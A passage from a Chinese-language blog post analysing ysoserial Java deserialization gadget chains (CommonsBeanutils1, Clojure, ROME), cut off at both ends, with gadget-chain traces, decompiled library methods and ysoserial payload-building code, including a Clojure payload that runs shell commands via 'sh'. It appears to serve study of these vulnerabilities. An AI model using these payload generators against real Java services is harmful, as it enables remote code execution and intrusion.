class="number">3</span>);</span><br><span class="line">    buffer.append(<span class="string">&quot;get&quot;</span>);</span><br><span class="line">    buffer.append(Character.toUpperCase(property.charAt(<span class="number">0</span>)));</span><br><span class="line">    buffer.append(property.substring(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> buffer.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h2><blockquote><p>思路同 CC2、Click1<br>改用 BeanComparator 作为比较器</p></blockquote><p>适用版本</p><ul><li>commons-beanutils:1.9.2</li><li>commons-collections:3.1</li><li>commons-logging:1.2</li></ul><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">      PriorityQueue.heapify()</span><br><span class="line">        PriorityQueue.siftDown()</span><br><span class="line">          PriorityQueue.siftDownUsingComparator()</span><br><span class="line">            BeanComparator.compare()</span><br><span class="line">                PropertyUtils.getProperty()</span><br><span class="line">                    PropertyUtilsBean.getProperty()</span><br><span class="line">                        PropertyUtilsBean.getNestedProperty()</span><br><span class="line">                            PropertyUtilsBean.getSimpleProperty()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.getOutputProperties()</span><br><span class="line">                                        ...</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/OAfq1WD6UhIbRQv.png" ><p>ysoserial.payloads.CommonsCollections7#getObject 和 CC2 基本相同，中间使用 BeanComparator 作为比较器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 承载恶意代码</span></span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较器</span></span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">&quot;lowestSetBit&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建优先队列</span></span><br><span class="line">    <span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="keyword">new</span> BigInteger(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">queue.add(<span class="keyword">new</span> BigInteger(<span class="string">&quot;1&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置比较器调用 getoutputProperties 方法</span></span><br><span class="line">    <span class="comment">// switch method called by comparator</span></span><br><span class="line">Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 替换队列中的数据</span></span><br><span class="line">    <span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = templates;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BeanComparator#compare 方法中调用了 PropertyUtils.getProperty 获取属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(T o1, T o2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.property == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.internalCompare(o1, o2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object value1 = PropertyUtils.getProperty(o1, <span class="keyword">this</span>.property);   <span class="comment">// 这里</span></span><br><span class="line">            Object value2 = PropertyUtils.getProperty(o2, <span class="keyword">this</span>.property);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.internalCompare(value1, value2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;IllegalAccessException: &quot;</span> + var5.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;InvocationTargetException: &quot;</span> + var6.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;NoSuchMethodException: &quot;</span> + var7.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PropertyUtils#getProperty 方法创建 PropertyUtilsBean，并调用其 getProperty 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> PropertyUtilsBean.getInstance().getProperty(bean, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PropertyUtilsBean#getProperty 方法用于执行任务，调用 getNestedProperty 方法。具体是调用 getSimpleProperty 方法，然后调用对象的 getter 方法获取属性，实际调用 TemplatesImpl.getOutputProperties</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getNestedProperty(bean, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Clojure"><a href="#Clojure" class="headerlink" title="Clojure"></a>Clojure</h2><blockquote><p>Clojure 是 Lisp 编程语言在 Java 平台上的现代、动态及函数式方言；说白了就是用 Clojure 在 Java 中执行 Lisp 代码。<br>利用 HashMap 返序列化执行 hashCode 方法的特性，将其替换为调用 AbstractTableModel$ff19274a.hashCode</p></blockquote><p>适用版本</p><ul><li>clojure:1.8.0</li></ul><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">HashMap.readObject()</span><br><span class="line">AbstractTableModel$ff19274a.hashCode()</span><br><span class="line">clojure.core$comp$fn__4727.invoke()</span><br><span class="line">clojure.core$constantly$fn__4614.invoke()</span><br><span class="line">clojure.main$eval_opt.invoke()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/hIj4DHVNTepsAaw.png" ><p>ysoserial.payloads.Clojure#getObject 返回的 targetMap(HashMap) 包含 <code>model(AbstractTableModel$ff19274a) -&gt; null</code> 的映射，model.__initClojureFnMappings = fnMap(HashMap)，fnMap中的键为 hashCode，值为 g、f(core$comp$fn__4727)。</p><p>反序列化时调用 HashMap.readObject，进一步调用 AbstractTableModel$ff19274a.hashCode，因为 __clojureFnMap 有值所以调用 core$comp$fn__4727.invoke 最终调用的是构造的 <code>clojure.core\$comp().invoke(clojure.main\$eval_opt(), clojure.core\$constantly().invoke(clojurePayload))</code>。clojure.core$constantly().invoke(clojurePayload) 返回 core$constantly$fn__4614 对象，其属性 x 为构造的 payload，后续进入 clojure.main$eval_opt().invokeStatic 的 for 循环时执行指令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AbstractTableModel$ff19274a</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object var10000 = RT.get(<span class="keyword">this</span>.__clojureFnMap, <span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> var10000 != <span class="keyword">null</span> ? ((Number)((IFn)var10000).invoke(<span class="keyword">this</span>)).intValue() : <span class="keyword">super</span>.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// core$comp$fn__4727</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((IFn)<span class="keyword">this</span>.f).invoke(((IFn)<span class="keyword">this</span>.g).invoke());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">    IFn var10000 = (IFn)<span class="keyword">this</span>.f;</span><br><span class="line">    IFn var10001 = (IFn)<span class="keyword">this</span>.g;</span><br><span class="line">    Object var10002 = x;</span><br><span class="line">    x = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> var10000.invoke(var10001.invoke(var10002));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main$eval_opt</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeStatic</span><span class="params">(Object str)</span> </span>&#123;</span><br><span class="line">    Object eof = <span class="keyword">new</span> Object();</span><br><span class="line">    Object var10004 = str;</span><br><span class="line">    str = <span class="keyword">null</span>;</span><br><span class="line">    Object reader = <span class="keyword">new</span> LineNumberingPushbackReader((Reader)(<span class="keyword">new</span> StringReader((String)var10004)));</span><br><span class="line">    push_thread_bindings.invokeStatic(hash_map.invokeStatic(ArraySeq.create(<span class="keyword">new</span> Object[]&#123;const__2, Util.equiv(const__4, const__2.get()) ? Boolean.TRUE : const__2.get()&#125;)));</span><br><span class="line">    <span class="keyword">for</span>(Object input = ((IFn)(<span class="keyword">new</span> main$eval_opt$fn__7422(reader, eof))).invoke(); !Util.equiv(input, eof); input = ((IFn)(<span class="keyword">new</span> main$eval_opt$fn__7424(reader, eof))).invoke()) &#123; <span class="comment">// 执行指令</span></span><br><span class="line">        Object var10000 = input;</span><br><span class="line">        input = <span class="keyword">null</span>;</span><br><span class="line">        Object value = eval.invokeStatic(var10000);</span><br><span class="line">        <span class="keyword">if</span> (Util.identical(value, (Object)<span class="keyword">null</span>)) &#123;</span><br><span class="line">            var10000 = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object[] var5 = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line">            Object var10003 = value;</span><br><span class="line">            value = <span class="keyword">null</span>;</span><br><span class="line">            var5[<span class="number">0</span>] = var10003;</span><br><span class="line">            prn.invokeStatic(ArraySeq.create(var5));</span><br><span class="line">        &#125;</span><br><span class="line">        push_thread_bindings.invokeStatic(hash_map.invokeStatic(ArraySeq.create(<span class="keyword">new</span> Object[]&#123;const__2, Util.equiv(const__4, const__2.get()) ? Boolean.TRUE : const__2.get()&#125;)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// core$constantly$fn__4614</span></span><br><span class="line"><span class="keyword">public</span> core$constantly$fn__4614(Object var1) &#123;</span><br><span class="line">    <span class="keyword">this</span>.x = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC 构造如下，注释掉其中两行也可以执行成功</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;?, ?&gt; getObject(<span class="keyword">final</span> String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转义</span></span><br><span class="line">    String cmd = Strings.join(Arrays.asList(command.replaceAll(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\&quot;</span>).split(<span class="string">&quot; &quot;</span>)), <span class="string">&quot; &quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在 Clojure 包中调用 shell 命令</span></span><br><span class="line">    <span class="keyword">final</span> String clojurePayload =</span><br><span class="line">        String.format(<span class="string">&quot;(use &#x27;[clojure.java.shell :only [sh]]) (sh %s)&quot;</span>, cmd);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    Map&lt;String, Object&gt; fnMap = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line"><span class="comment">// fnMap.put(&quot;hashCode&quot;, new clojure.core$constantly().invoke(0));</span></span><br><span class="line">    </span><br><span class="line">    AbstractTableModel$ff19274a model = <span class="keyword">new</span> AbstractTableModel$ff19274a();</span><br><span class="line"><span class="comment">// model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));</span></span><br><span class="line">    </span><br><span class="line">    HashMap&lt;Object, Object&gt; targetMap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">targetMap.put(model, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加到 Map 中</span></span><br><span class="line">    fnMap.put(<span class="string">&quot;hashCode&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> clojure.core$comp().invoke(</span><br><span class="line"><span class="keyword">new</span> clojure.main$eval_opt(),    <span class="comment">// 函数体为空</span></span><br><span class="line"><span class="keyword">new</span> clojure.core$constantly().invoke(clojurePayload))); <span class="comment">// core$constantly 函数体为空</span></span><br><span class="line">    <span class="comment">// 通过 PersistentArrayMap 转换 fnMap 的属性</span></span><br><span class="line">model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> targetMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clojure.core$constantly().invoke(clojurePayload) 实际调用 core$constantly$fn__4614(clojurePayload)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">core</span>$<span class="title">constantly</span> <span class="keyword">extends</span> <span class="title">AFunction</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> core$constantly() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeStatic</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">        Object var10002 = x;</span><br><span class="line">        x = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> core$constantly$fn__4614(var10002);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">        Object var10000 = var1;</span><br><span class="line">        var1 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> invokeStatic(var10000);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就一个赋值操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> core$constantly$fn__4614(Object var1) &#123;</span><br><span class="line">    <span class="keyword">this</span>.x = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clojure.core$comp().invoke 实际调用 core$comp$fn__4727</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Object var2)</span> </span>&#123;</span><br><span class="line">    Object var10000 = var1;</span><br><span class="line">    var1 = <span class="keyword">null</span>;</span><br><span class="line">    Object var10001 = var2;</span><br><span class="line">    var2 = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> invokeStatic(var10000, var10001);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeStatic</span><span class="params">(Object f, Object g)</span> </span>&#123;</span><br><span class="line">    Object var10002 = g;</span><br><span class="line">    g = <span class="keyword">null</span>;</span><br><span class="line">    Object var10003 = f;</span><br><span class="line">    f = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> core$comp$fn__4727(var10002, var10003);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就一个赋值操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> core$comp$fn__4727(Object var1, Object var2) &#123;</span><br><span class="line">    <span class="keyword">this</span>.g = var1;</span><br><span class="line">    <span class="keyword">this</span>.f = var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>model.__initClojureFnMappings(PersistentArrayMap.create(fnMap)); 也就是赋值操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">__updateClojureFnMappings</span><span class="params">(IPersistentMap var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.__clojureFnMap = (IPersistentMap)((IPersistentCollection)<span class="keyword">this</span>.__clojureFnMap).cons(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h2><blockquote><p>ROME 是 RSS/Atom 订阅框架<br>和 CC2 类似，使用 TemplatesImpl 承载恶意代码；和 URLDNS 类似，利用 HashMap 的反序列化操作<br>通过 ObjectBean.hashCode 触发</p></blockquote><p>适用版本</p><ul><li>rome:1.0</li></ul><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            ObjectBean.hashCode()</span><br><span class="line">                EqualsBean.beanHashCode()</span><br><span class="line">                    ObjectBean.toString()</span><br><span class="line">                        ToStringBean.toString()</span><br><span class="line">                            ToStringBean.toString(String)</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.getOutputProperties()</span><br><span class="line">                                        ...</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/kIZ8fRB4lNpuyA9.png" ><p>ysoserial.payloads.ROME#getObject 十分简短，需要注意的是这里必须通过两个 ObjectBean 才能触发漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 创建 TemplatesImpl 承载执行代码</span></span><br><span class="line">    Object o = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过两个 ObjectBean 达成触发条件</span></span><br><span class="line">    ObjectBean delegate = <span class="keyword">new</span> ObjectBean(Templates.class, o);</span><br><span class="line">    ObjectBean root  = <span class="keyword">new</span> ObjectBean(ObjectBean.class, delegate);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 HashMap</span></span><br><span class="line">    <span class="keyword">return</span> Gadgets.makeMap(root, root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果只用 <code>ObjectBean(Templates.class, TemplatesImpl)</code> 构造 HashMap，则反序列化时报错</p><ul><li>构造 POC 用的是 <code>ObjectBean(ObjectBean.class, ObjectBean(Templates.class, TemplatesImpl))</code></li></ul><p>因为计算哈希值时会对 value(TemplatesImpl) 调用 <code>ObjectBean.hashCode</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Exception <span class="keyword">in</span> thread <span class="string">&quot;main&quot;</span> java.lang.IllegalArgumentException: class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl is not instance of class com.sun.syndication.feed.impl.ObjectBean</span><br><span class="line">at com.sun.syndication.feed.impl.EqualsBean.&lt;init&gt;(EqualsBean.java:85)</span><br><span class="line">at com.sun.syndication.feed.impl.ObjectBean.&lt;init&gt;(ObjectBean.java:74)</span><br><span class="line">at com.sun.syndication.feed.impl.ObjectBean.&lt;init&gt;(ObjectBean.java:56)</span><br><span class="line">at ysoserial.payloads.ROME.getObject(ROME.java:38)</span><br></pre></td></tr></table></figure><p>当 HashMap 反序列化时会对元素计算哈希值，调用对象的 hashCode 方法，这里就是 <code>ObjectBean.hashCode</code> 方法，实际调用的是 <code>EqualsBean.beanHashCode</code>，然后进一步调用 <code>ObjectBean.toString</code> 方法返回 <code>ToStringBean.toString</code>，在这个函数中会触发 <code>TemplatesImpl.getOutputProperties</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ObjectBean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._equalsBean.beanHashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EqualsBean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">beanHashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._obj.toString().hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ObjectBean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._toStringBean.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ToStringBean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Stack stack = (Stack)PREFIX_TL.get();</span><br><span class="line">    String[] tsInfo = (String[])(stack.isEmpty() ? <span class="keyword">null</span> : stack.peek());</span><br><span class="line">    String prefix;</span><br><span class="line">    <span class="keyword">if</span> (tsInfo == <span class="keyword">null</span>) &#123;</span><br><span class="line">        String className = <span class="keyword">this</span>._obj.getClass().getName();</span><br><span class="line">        prefix = className.substring(className.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        prefix = tsInfo[<span class="number">0</span>];</span><br><span class="line">        tsInfo[<span class="number">1</span>] = prefix;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.toString(prefix);   <span class="comment">// 这里</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">toString</span><span class="params">(String 